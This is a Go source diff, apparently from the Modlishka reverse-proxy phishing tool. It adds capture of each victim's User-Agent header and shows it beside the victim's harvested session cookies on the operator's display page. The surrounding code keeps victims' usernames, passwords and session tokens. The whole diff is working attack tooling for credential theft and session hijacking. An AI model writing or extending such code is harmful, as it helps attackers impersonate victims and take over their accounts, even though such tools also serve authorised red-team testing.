@@ -250,6 +250,11 @@ setTimeout(function() {document.location='/'; }, 5000);
 </html>
 `
 
+type TemplateOutput struct {
+	Cookies string
+	UserAgent string
+}
+
 var cookietemplate = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -263,8 +268,10 @@ var cookietemplate = `<!DOCTYPE html>
 <body>
 
 <div class="container">
+  <h2>User Agent</h2>
+  <pre>{{ .UserAgent }}</pre>
   <h2>Cookies</h2>
-  <pre>{{ . }}</pre>
+  <pre>{{ .Cookies }}</pre>
 </div>
 
 </body>
@@ -277,6 +284,7 @@ type Victim struct {
 	Username   string
 	Password   string
 	Session    string
+	UserAgent  string
 	Terminated bool
 }
 
@@ -535,6 +543,10 @@ func (config *ControlConfig) updateEntry(victim *Victim) error {
 
 	if victim.Terminated {
 		entry.Terminated = true
+	}
+
+	if victim.UserAgent != "" {
+		entry.UserAgent = victim.UserAgent
 	}
 
 	err = config.addEntry(entry)
@@ -874,7 +886,7 @@ func HelloHandlerCookieDisplay(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
+	victim := Victim{UUID: users[0], Username: "", Password: "", Session: "", UserAgent: ""}
 	entry, err := CConfig.getEntry(&victim)
 	if err != nil {
 		log.Infof("Error %s", err.Error())
@@ -897,13 +909,17 @@ func HelloHandlerCookieDisplay(w http.ResponseWriter, r *http.Request) {
 	cookiesByte, _ := json.MarshalIndent(cookies, "", "  ")
 	cookiesOut := string(cookiesByte)
 
+	userAgentOut := entry.UserAgent
+
+	templateData := TemplateOutput{Cookies: cookiesOut, UserAgent: userAgentOut}
+
 	w.WriteHeader(http.StatusOK)
 
 	w.Header().Set("Content-Type", "application/html")
 
 	t := template.New("modlishkacookiejson")
 	t, _ = t.Parse(cookietemplate)
-	_ = t.Execute(w, cookiesOut)
+	_ = t.Execute(w, templateData)
 
 }
 
@@ -1113,6 +1129,14 @@ func init() {
 				notifyCollection(&victim)
 				//_=CConfig.printEntries()
 
+			}
+
+			// update user agent string
+			victim := Victim{UUID: context.UserID}
+			entry, err := CConfig.getEntry(&victim)
+			if err == nil {
+				entry.UserAgent = req.Header.Get("User-Agent")
+				_ = CConfig.updateEntry(entry)
 			}
 
 			cookies := req.Cookies()
